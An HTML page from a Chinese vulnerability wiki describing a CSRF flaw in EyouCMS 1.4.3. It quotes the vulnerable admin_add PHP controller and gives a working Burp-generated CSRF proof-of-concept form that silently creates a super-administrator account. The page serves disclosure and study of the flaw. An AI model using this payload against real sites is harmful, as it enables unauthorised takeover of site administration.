@@ -1,0 +1,230 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  
+  
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    
+    <meta name="author" content="内部使用">
+    <link rel="canonical" href="https://secnn.com/Web%E5%BA%94%E7%94%A8%E6%BC%8F%E6%B4%9E/Eyoucms/Eyoucms%201.4.3%20csrf%E6%BC%8F%E6%B4%9E/">
+    <link rel="shortcut icon" href="../../../favicon.ico">
+    
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" />
+    <title>Eyoucms 1.4.3 csrf漏洞 - SecNN-Wiki漏洞库管理系统&网络安全知识库-本Wiki所有信息来源于公开漏洞数据库</title>
+    <link href="../../../css/bootstrap-3.3.7.min.css" rel="stylesheet">
+    <link href="../../../css/font-awesome-4.7.0.css" rel="stylesheet">
+    <link href="../../../css/base.css" rel="stylesheet">
+    <link rel="stylesheet" href="../../../css/highlight.css">
+    <!-- HTML5 shim and Respond.js IE8 support of HTML5 elements and media queries -->
+    <!--[if lt IE 9]>
+        <script src="https://oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
+        <script src="https://oss.maxcdn.com/libs/respond.js/1.3.0/respond.min.js"></script>
+    <![endif]-->
+
+    <script src="../../../js/jquery-3.2.1.min.js"></script>
+    <script src="../../../js/bootstrap-3.3.7.min.js"></script>
+    <script src="../../../js/highlight.pack.js"></script>
+    
+    <base target="_top">
+    <script>
+      var base_url = '../../..';
+      var is_top_frame = false;
+        
+        var pageToc = [
+          {title: "Eyoucms 1.4.3 csrf\u6f0f\u6d1e", url: "#_top", children: [
+              {title: "\u4e00\u3001\u6f0f\u6d1e\u7b80\u4ecb", url: "#_1" },
+              {title: "\u4e8c\u3001\u6f0f\u6d1e\u5f71\u54cd", url: "#_2" },
+              {title: "\u4e09\u3001\u590d\u73b0\u8fc7\u7a0b", url: "#_3" },
+          ]},
+        ];
+
+    </script>
+    <script src="../../../js/base.js"></script>
+      <script src="../../../search/main.js"></script> 
+</head>
+
+<body>
+<script>
+if (is_top_frame) { $('body').addClass('wm-top-page'); }
+</script>
+
+
+
+<div class="container-fluid wm-page-content">
+  <a name="_top"></a>
+    
+
+    
+    
+      
+    
+
+  <div class="row wm-article-nav-buttons" role="navigation" aria-label="navigation">
+    
+    <div class="wm-article-nav pull-right">
+      <a href="../Eyoucms%201.4.3%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%86%99%E5%85%A5/" class="btn btn-xs btn-default pull-right">
+        Next
+        <i class="fa fa-chevron-right" aria-hidden="true"></i>
+      </a>
+      <a href="../Eyoucms%201.4.3%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%86%99%E5%85%A5/" class="btn btn-xs btn-link">
+        Eyoucms 1.4.3 任意文件写入
+      </a>
+    </div>
+    
+    <div class="wm-article-nav">
+      <a href="../Eyoucms%201.4.2%20%E5%90%8E%E5%8F%B0%E6%B3%A8%E5%85%A5/" class="btn btn-xs btn-default pull-left">
+        <i class="fa fa-chevron-left" aria-hidden="true"></i>
+        Previous</a><a href="../Eyoucms%201.4.2%20%E5%90%8E%E5%8F%B0%E6%B3%A8%E5%85%A5/" class="btn btn-xs btn-link">
+        Eyoucms 1.4.2 后台注入
+      </a>
+    </div>
+    
+  </div>
+
+    
+
+    <h1 id="eyoucms-143-csrf">Eyoucms 1.4.3 csrf漏洞<a class="headerlink" href="#eyoucms-143-csrf" title="Permanent link">&para;</a></h1>
+<h2 id="_1">一、漏洞简介<a class="headerlink" href="#_1" title="Permanent link">&para;</a></h2>
+<p>可通过csrf漏洞添加管理员</p>
+<h2 id="_2">二、漏洞影响<a class="headerlink" href="#_2" title="Permanent link">&para;</a></h2>
+<p>Eyoucms 1.4.3</p>
+<h2 id="_3">三、复现过程<a class="headerlink" href="#_3" title="Permanent link">&para;</a></h2>
+<h3 id="_4">漏洞分析<a class="headerlink" href="#_4" title="Permanent link">&para;</a></h3>
+<p>漏洞触发点在<code>application\admin\controller\Admin.php</code></p>
+<div class="codehilite"><pre><span></span><code><span class="w">  </span><span class="nt">public</span><span class="w"> </span><span class="nt">function</span><span class="w"> </span><span class="nt">admin_add</span><span class="o">()</span>
+<span class="w"> </span><span class="p">{</span>
+<span class="w">     </span><span class="err">$this-&gt;language_access()</span><span class="p">;</span><span class="w"> </span><span class="err">//</span><span class="w"> </span><span class="err">多语言功能操作权限</span>
+
+<span class="w">     </span><span class="err">if</span><span class="w"> </span><span class="err">(IS_POST)</span><span class="w"> </span><span class="err">{</span>
+<span class="w">         </span><span class="err">$data</span><span class="w"> </span><span class="err">=</span><span class="w"> </span><span class="err">input(&#39;post.&#39;)</span><span class="p">;</span>
+
+<span class="w">         </span><span class="err">if</span><span class="w"> </span><span class="err">(0</span><span class="w"> </span><span class="err">&lt;</span><span class="w"> </span><span class="err">intval(session(&#39;admin_info.role_id&#39;)))</span><span class="w"> </span><span class="err">{</span>
+<span class="w">             </span><span class="err">$this-&gt;error(&quot;超级管理员才能操作！&quot;)</span><span class="p">;</span>
+<span class="w">         </span><span class="p">}</span>
+
+<span class="w">         </span><span class="nt">if</span><span class="w"> </span><span class="o">(</span><span class="nt">empty</span><span class="o">($</span><span class="nt">data</span><span class="cp">[</span><span class="s1">&#39;password&#39;</span><span class="cp">]</span><span class="o">)</span><span class="w"> </span><span class="o">||</span><span class="w"> </span><span class="nt">empty</span><span class="o">($</span><span class="nt">data</span><span class="cp">[</span><span class="s1">&#39;password2&#39;</span><span class="cp">]</span><span class="o">))</span><span class="w"> </span><span class="p">{</span>
+<span class="w">             </span><span class="err">$this-&gt;error(&quot;密码不能为空！&quot;)</span><span class="p">;</span>
+<span class="w">         </span><span class="p">}</span><span class="nt">else</span><span class="w"> </span><span class="nt">if</span><span class="w"> </span><span class="o">($</span><span class="nt">data</span><span class="cp">[</span><span class="s1">&#39;password&#39;</span><span class="cp">]</span><span class="w"> </span><span class="o">!=</span><span class="w"> </span><span class="o">$</span><span class="nt">data</span><span class="cp">[</span><span class="s1">&#39;password2&#39;</span><span class="cp">]</span><span class="o">)</span><span class="w"> </span><span class="p">{</span>
+<span class="w">             </span><span class="err">$this-&gt;error(&quot;两次密码输入不一致！&quot;)</span><span class="p">;</span>
+<span class="w">         </span><span class="p">}</span>
+
+<span class="w">         </span><span class="o">...</span>
+
+<span class="w">         </span><span class="nt">if</span><span class="w"> </span><span class="o">(</span><span class="nt">empty</span><span class="o">($</span><span class="nt">data</span><span class="cp">[</span><span class="s1">&#39;pen_name&#39;</span><span class="cp">]</span><span class="o">))</span><span class="w"> </span><span class="p">{</span>
+<span class="w">             </span><span class="err">$data</span><span class="cp">[</span><span class="s1">&#39;pen_name&#39;</span><span class="cp">]</span><span class="w"> </span><span class="err">=</span><span class="w"> </span><span class="err">$data</span><span class="cp">[</span><span class="s1">&#39;user_name&#39;</span><span class="cp">]</span><span class="p">;</span>
+<span class="w">         </span><span class="p">}</span>
+<span class="w">         </span><span class="nt">if</span><span class="w"> </span><span class="o">(</span><span class="nt">M</span><span class="o">(</span><span class="s1">&#39;admin&#39;</span><span class="o">)</span><span class="nt">-</span><span class="o">&gt;</span><span class="nt">where</span><span class="o">(</span><span class="s2">&quot;user_name&quot;</span><span class="o">,</span><span class="w"> </span><span class="o">$</span><span class="nt">data</span><span class="cp">[</span><span class="s1">&#39;user_name&#39;</span><span class="cp">]</span><span class="o">)</span><span class="nt">-</span><span class="o">&gt;</span><span class="nt">count</span><span class="o">())</span><span class="w"> </span><span class="p">{</span>
+<span class="w">             </span><span class="err">$this-&gt;error(&quot;此用户名已被注册，请更换&quot;,url(&#39;Admin/admin_add&#39;))</span><span class="p">;</span>
+<span class="w">         </span><span class="p">}</span><span class="w"> </span><span class="nt">else</span><span class="w"> </span><span class="p">{</span>
+<span class="w">             </span><span class="err">$admin_id</span><span class="w"> </span><span class="err">=</span><span class="w"> </span><span class="err">M(&#39;admin&#39;)-&gt;insertGetId($data)</span><span class="p">;</span>
+<span class="w">             </span><span class="err">if</span><span class="w"> </span><span class="err">($admin_id)</span><span class="w"> </span><span class="err">{</span>
+<span class="w">                 </span><span class="err">adminLog(&#39;新增管理员：&#39;.$data</span><span class="cp">[</span><span class="s1">&#39;user_name&#39;</span><span class="cp">]</span><span class="err">)</span><span class="p">;</span>
+
+<span class="w">                 </span><span class="c">/*同步追加一个后台管理员到会员用户表*/</span>
+<span class="w">                 </span><span class="err">try</span><span class="w"> </span><span class="err">{</span>
+<span class="w">                     </span><span class="err">$usersInfo</span><span class="w"> </span><span class="err">=</span><span class="w"> </span><span class="n">Db</span><span class="p">:</span><span class="o">:</span><span class="nf">name</span><span class="p">(</span><span class="s1">&#39;users&#39;</span><span class="p">)</span><span class="o">-&gt;</span><span class="nf">field</span><span class="p">(</span><span class="s1">&#39;users_id&#39;</span><span class="p">)</span><span class="o">-&gt;</span><span class="nf">where</span><span class="p">(</span><span class="cp">[</span>
+<span class="w">                             </span><span class="s1">&#39;username&#39;</span><span class="w">  </span><span class="o">=&gt;</span><span class="w"> </span><span class="nv">$data</span><span class="err">[</span><span class="s1">&#39;user_name&#39;</span><span class="cp">]</span><span class="p">,</span>
+<span class="w">                             </span><span class="s1">&#39;lang&#39;</span><span class="w">      </span><span class="err">=&gt;</span><span class="w"> </span><span class="err">$</span><span class="n">this</span><span class="o">-</span><span class="err">&gt;</span><span class="n">admin_lang</span><span class="p">,</span>
+<span class="w">                         </span><span class="err">]</span><span class="p">)</span><span class="o">-&gt;</span><span class="nf">find</span><span class="p">();</span>
+<span class="w">                     </span><span class="err">if</span><span class="w"> </span><span class="err">(!empty($usersInfo))</span><span class="w"> </span><span class="err">{</span>
+<span class="w">                         </span><span class="err">$r</span><span class="w"> </span><span class="err">=</span><span class="w"> </span><span class="n">Db</span><span class="p">:</span><span class="o">:</span><span class="nf">name</span><span class="p">(</span><span class="s1">&#39;users&#39;</span><span class="p">)</span><span class="o">-&gt;</span><span class="nf">where</span><span class="p">(</span><span class="cp">[</span><span class="s1">&#39;users_id&#39;</span><span class="o">=&gt;</span><span class="nv">$usersInfo</span><span class="err">[</span><span class="s1">&#39;users_id&#39;</span><span class="cp">]</span><span class="err">]</span><span class="p">)</span><span class="o">-&gt;</span><span class="nf">update</span><span class="p">(</span><span class="cp">[</span>
+<span class="w">                                 </span><span class="s1">&#39;nickname&#39;</span><span class="w">      </span><span class="o">=&gt;</span><span class="w"> </span><span class="nv">$data</span><span class="err">[</span><span class="s1">&#39;user_name&#39;</span><span class="cp">]</span><span class="p">,</span>
+<span class="w">                                 </span><span class="s1">&#39;admin_id&#39;</span><span class="w">      </span><span class="err">=&gt;</span><span class="w"> </span><span class="err">$</span><span class="n">admin_id</span><span class="p">,</span>
+<span class="w">                                 </span><span class="s1">&#39;is_activation&#39;</span><span class="w"> </span><span class="err">=&gt;</span><span class="w"> </span><span class="mi">1</span><span class="p">,</span>
+<span class="w">                                 </span><span class="s1">&#39;is_lock&#39;</span><span class="w">       </span><span class="err">=&gt;</span><span class="w"> </span><span class="mi">0</span><span class="p">,</span>
+<span class="w">                                 </span><span class="s1">&#39;is_del&#39;</span><span class="w">        </span><span class="err">=&gt;</span><span class="w"> </span><span class="mi">0</span><span class="p">,</span>
+<span class="w">                                 </span><span class="s1">&#39;update_time&#39;</span><span class="w">   </span><span class="err">=&gt;</span><span class="w"> </span><span class="nf">getTime</span><span class="p">(),</span>
+<span class="w">                             </span><span class="err">]</span><span class="p">);</span>
+<span class="w">                         </span><span class="err">!empty($r)</span><span class="w"> </span><span class="err">&amp;&amp;</span><span class="w"> </span><span class="err">$users_id</span><span class="w"> </span><span class="err">=</span><span class="w"> </span><span class="err">$usersInfo</span><span class="cp">[</span><span class="s1">&#39;users_id&#39;</span><span class="cp">]</span><span class="p">;</span>
+<span class="w">                     </span><span class="p">}</span><span class="w"> </span><span class="nt">else</span><span class="w"> </span><span class="p">{</span>
+<span class="w">                         </span><span class="err">//</span><span class="w"> </span><span class="err">获取要添加的用户名</span>
+<span class="w">                         </span><span class="err">...</span>
+
+<span class="w">                         </span><span class="err">$users_id</span><span class="w"> </span><span class="err">=</span><span class="w"> </span><span class="n">Db</span><span class="p">:</span><span class="o">:</span><span class="nf">name</span><span class="p">(</span><span class="s1">&#39;users&#39;</span><span class="p">)</span><span class="o">-&gt;</span><span class="nf">insertGetId</span><span class="p">(</span><span class="err">$</span><span class="n">AddData</span><span class="p">);</span>
+<span class="w">                     </span><span class="p">}</span>
+<span class="w">                     </span><span class="nt">if</span><span class="w"> </span><span class="o">(!</span><span class="nt">empty</span><span class="o">($</span><span class="nt">users_id</span><span class="o">))</span><span class="w"> </span><span class="p">{</span>
+<span class="w">                         </span><span class="n">Db</span><span class="p">:</span><span class="o">:</span><span class="nf">name</span><span class="p">(</span><span class="s1">&#39;admin&#39;</span><span class="p">)</span><span class="o">-&gt;</span><span class="nf">where</span><span class="p">(</span><span class="cp">[</span><span class="s1">&#39;admin_id&#39;</span><span class="o">=&gt;</span><span class="nv">$admin_id</span><span class="cp">]</span><span class="p">)</span><span class="o">-&gt;</span><span class="nf">update</span><span class="p">(</span><span class="cp">[</span>
+<span class="w">                                 </span><span class="s1">&#39;syn_users_id&#39;</span><span class="w">  </span><span class="o">=&gt;</span><span class="w"> </span><span class="nv">$users_id</span><span class="p">,</span>
+<span class="w">                                 </span><span class="s1">&#39;update_time&#39;</span><span class="w">   </span><span class="o">=&gt;</span><span class="w"> </span><span class="nx">getTime</span><span class="p">(),</span>
+<span class="w">                             </span><span class="cp">]</span><span class="p">);</span>
+<span class="w">                     </span><span class="p">}</span>
+<span class="w">                 </span><span class="err">}</span><span class="w"> </span><span class="nt">catch</span><span class="w"> </span><span class="o">(</span><span class="err">\</span><span class="nt">Exception</span><span class="w"> </span><span class="o">$</span><span class="nt">e</span><span class="o">)</span><span class="w"> </span><span class="p">{}</span>
+<span class="w">                 </span><span class="c">/* END */</span>
+
+<span class="w">                 </span><span class="o">$</span><span class="nt">this-</span><span class="o">&gt;</span><span class="nt">success</span><span class="o">(</span><span class="s2">&quot;操作成功&quot;</span><span class="o">,</span><span class="w"> </span><span class="nt">url</span><span class="o">(</span><span class="s1">&#39;Admin/index&#39;</span><span class="o">));</span>
+<span class="w">             </span><span class="err">}</span><span class="w"> </span><span class="nt">else</span><span class="w"> </span><span class="p">{</span>
+<span class="w">                 </span><span class="err">$this-&gt;error(&quot;操作失败&quot;)</span><span class="p">;</span>
+<span class="w">             </span><span class="p">}</span>
+<span class="w">         </span><span class="err">}</span>
+<span class="w">     </span><span class="err">}</span>
+</code></pre></div>
+
+<p>可以看到进队管理员权限进行校验，而没有对提交token进行校验，导致恶意用户可引导管理员点击构造的url进行管理员添加，实际操作可不跳转到管理页面，以免引起怀疑。</p>
+<h3 id="_5">漏洞复现<a class="headerlink" href="#_5" title="Permanent link">&para;</a></h3>
+<p>登陆后台，在高级选项&gt;管理员&gt;新增管理员点击之后截包</p>
+<p><img alt="" src="../resource/Eyoucms1.4.3csrf%E6%BC%8F%E6%B4%9E/media/rId26.png" /></p>
+<h3 id="poc">poc<a class="headerlink" href="#poc" title="Permanent link">&para;</a></h3>
+<div class="codehilite"><pre><span></span><code><span class="w"> </span><span class="nt">&lt;html&gt;</span>
+<span class="w"> </span><span class="cm">&lt;!-- CSRF PoC - generated by Burp Suite Professional --&gt;</span>
+<span class="w"> </span><span class="nt">&lt;body&gt;</span>
+<span class="w"> </span><span class="nt">&lt;script&gt;</span>history.pushState(&#39;&#39;,<span class="w"> </span>&#39;&#39;,<span class="w"> </span>&#39;/&#39;)<span class="nt">&lt;/script&gt;</span>
+<span class="w">     </span><span class="nt">&lt;form</span><span class="w"> </span><span class="na">action=</span><span class="s">&quot;http://127.0.0.1/EyouCMS1.4.3/login.php?m=admin&amp;c=Admin&amp;a=admin_add&amp;lang=cn&quot;</span><span class="w"> </span><span class="na">method=</span><span class="s">&quot;POST&quot;</span><span class="nt">&gt;</span>
+<span class="w">     </span><span class="nt">&lt;input</span><span class="w"> </span><span class="na">type=</span><span class="s">&quot;hidden&quot;</span><span class="w"> </span><span class="na">name=</span><span class="s">&quot;user&amp;#95;name&quot;</span><span class="w"> </span><span class="na">value=</span><span class="s">&quot;test&quot;</span><span class="w"> </span><span class="nt">/&gt;</span>
+<span class="w">     </span><span class="nt">&lt;input</span><span class="w"> </span><span class="na">type=</span><span class="s">&quot;hidden&quot;</span><span class="w"> </span><span class="na">name=</span><span class="s">&quot;password&quot;</span><span class="w"> </span><span class="na">value=</span><span class="s">&quot;test&quot;</span><span class="w"> </span><span class="nt">/&gt;</span>
+<span class="w">     </span><span class="nt">&lt;input</span><span class="w"> </span><span class="na">type=</span><span class="s">&quot;hidden&quot;</span><span class="w"> </span><span class="na">name=</span><span class="s">&quot;password2&quot;</span><span class="w"> </span><span class="na">value=</span><span class="s">&quot;test&quot;</span><span class="w"> </span><span class="nt">/&gt;</span>
+<span class="w">     </span><span class="nt">&lt;input</span><span class="w"> </span><span class="na">type=</span><span class="s">&quot;hidden&quot;</span><span class="w"> </span><span class="na">name=</span><span class="s">&quot;pen&amp;#95;name&quot;</span><span class="w"> </span><span class="na">value=</span><span class="s">&quot;&quot;</span><span class="w"> </span><span class="nt">/&gt;</span>
+<span class="w">     </span><span class="nt">&lt;input</span><span class="w"> </span><span class="na">type=</span><span class="s">&quot;hidden&quot;</span><span class="w"> </span><span class="na">name=</span><span class="s">&quot;true&amp;#95;name&quot;</span><span class="w"> </span><span class="na">value=</span><span class="s">&quot;&quot;</span><span class="w"> </span><span class="nt">/&gt;</span>
+<span class="w">     </span><span class="nt">&lt;input</span><span class="w"> </span><span class="na">type=</span><span class="s">&quot;hidden&quot;</span><span class="w"> </span><span class="na">name=</span><span class="s">&quot;mobile&quot;</span><span class="w"> </span><span class="na">value=</span><span class="s">&quot;&quot;</span><span class="w"> </span><span class="nt">/&gt;</span>
+<span class="w">     </span><span class="nt">&lt;input</span><span class="w"> </span><span class="na">type=</span><span class="s">&quot;hidden&quot;</span><span class="w"> </span><span class="na">name=</span><span class="s">&quot;role&amp;#95;id&quot;</span><span class="w"> </span><span class="na">value=</span><span class="s">&quot;&amp;#45;1&quot;</span><span class="w"> </span><span class="nt">/&gt;</span>
+<span class="w">     </span><span class="nt">&lt;input</span><span class="w"> </span><span class="na">type=</span><span class="s">&quot;submit&quot;</span><span class="w"> </span><span class="na">value=</span><span class="s">&quot;Submit request&quot;</span><span class="w"> </span><span class="nt">/&gt;</span>
+<span class="w">     </span><span class="nt">&lt;/form&gt;</span>
+<span class="w"> </span><span class="nt">&lt;/body&gt;</span>
+<span class="w"> </span><span class="nt">&lt;/html&gt;</span>
+</code></pre></div>
+
+<p>模拟管理员点击</p>
+<p><img alt="" src="../resource/Eyoucms1.4.3csrf%E6%BC%8F%E6%B4%9E/media/rId28.png" /></p>
+<p>添加完成</p>
+<p><img alt="" src="../resource/Eyoucms1.4.3csrf%E6%BC%8F%E6%B4%9E/media/rId29.png" /></p>
+
+  <br>
+    
+
+    
+    
+      
+    
+
+  <div class="row wm-article-nav-buttons" role="navigation" aria-label="navigation">
+    
+    <div class="wm-article-nav pull-right">
+      <a href="../Eyoucms%201.4.3%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%86%99%E5%85%A5/" class="btn btn-xs btn-default pull-right">
+        Next
+        <i class="fa fa-chevron-right" aria-hidden="true"></i>
+      </a>
+      <a href="../Eyoucms%201.4.3%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%86%99%E5%85%A5/" class="btn btn-xs btn-link">
+        Eyoucms 1.4.3 任意文件写入
+      </a>
+    </div>
+    
+    <div class="wm-article-nav">
+      <a href="../Eyoucms%201.4.2%20%E5%90%8E%E5%8F%B0%E6%B3%A8%E5%85%A5/" class="btn btn-xs btn-default pull-left">
+        <i class="fa fa-chevron-left" aria-hidden="true"></i>
+        Previous</a><a href="../Eyoucms%201.4.2%20%E5%90%8E%E5%8F%B0%E6%B3%A8%E5%85%A5/" class="btn btn-xs btn-link">
+        Eyoucms 1.4.2 后台注入
+      </a>
+    </div>
+    
+  </div>
+
+    <br>
+</div>
+
+<footer class="col-md-12 wm-page-content"><p>Copyright © 2025 SecNN-Wiki</p>
+  <p>Documentation built with <a href="http://www.mkdocs.org/">MkDocs</a> using <a href="None">Windmill Dark</a> theme by 内部使用 (noraj).</p>
+</footer>
+
+</body>
+</html>
